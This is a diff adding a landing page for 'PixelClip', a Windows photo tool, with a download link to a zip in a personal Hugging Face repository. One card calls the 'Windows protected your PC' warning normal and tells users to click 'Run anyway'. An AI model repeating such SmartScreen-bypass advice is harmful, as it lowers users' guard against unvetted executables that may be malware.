@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PixelClip - Free photo toolkit for Windows</title>
+<meta name="description" content="Remove backgrounds, upscale, erase objects, restore old photos and more. Runs on your PC. No account, no uploads.">
+<style>
+:root{--bg:#0f1b22;--card:#16252e;--line:#2a3b46;--text:#fff;--mute:#9db0bb;--pink:#ff4d8d}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.55 system-ui,-apple-system,Segoe UI,sans-serif}
+main{max-width:720px;margin:0 auto;padding:56px 20px}
+h1{font-size:40px;margin:0 0 8px;letter-spacing:-.5px}
+.sub{color:var(--mute);font-size:18px;margin:0 0 28px}
+.btn{display:inline-block;background:var(--pink);color:#fff;text-decoration:none;font-weight:700;font-size:18px;padding:16px 28px;border-radius:12px}
+.btn:active{transform:scale(.97)}
+.meta{color:var(--mute);font-size:14px;margin:10px 0 0}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px 22px;margin-top:28px}
+h2{font-size:18px;margin:0 0 10px}
+ol,ul{margin:0;padding-left:22px}
+li{margin:6px 0}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;padding:0;list-style:none}
+.grid li{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:10px 14px;margin:0}
+</style>
+</head>
+<body>
+<main>
+  <h1>PixelClip</h1>
+  <p class="sub">Remove backgrounds, upscale, erase objects, restore old photos and more. Runs on your PC. Your photos never leave it.</p>
+
+  <a class="btn" id="dl" href="https://huggingface.co/Tactician254/pixelclip/resolve/main/PixelClip.zip" download>Download for Windows</a>
+  <p class="meta">Free &middot; about 2.6 GB &middot; Windows 10 or 11 &middot; works offline</p>
+
+  <div class="card">
+    <h2>How to start</h2>
+    <ol>
+      <li>Download the file and wait for it to finish.</li>
+      <li>Right-click <b>PixelClip.zip</b>, choose <b>Extract All</b>, then <b>Extract</b>.</li>
+      <li>Open the <b>PixelClip</b> folder and double-click <b>PixelClip.exe</b>.</li>
+    </ol>
+  </div>
+
+  <div class="card">
+    <h2>Windows shows "Windows protected your PC"?</h2>
+    <p style="margin:0">This is normal for new apps. Click <b>More info</b>, then <b>Run anyway</b>.</p>
+  </div>
+
+  <h2 style="margin-top:32px">What you can do</h2>
+  <ul class="grid">
+    <li>Remove backgrounds</li><li>Enhance and sharpen</li><li>Upscale 2x or 4x</li><li>Erase objects</li>
+    <li>Restore old photos</li><li>Portrait retouch</li><li>Blur background</li><li>Hide faces</li><li>Vectorize logos</li>
+  </ul>
+</main>
+<script>
+document.getElementById("dl").addEventListener("click",function(){var b=this,t=b.textContent;b.textContent="Starting download...";setTimeout(function(){b.textContent=t},3000)});
+</script>
+</body>
+</html>
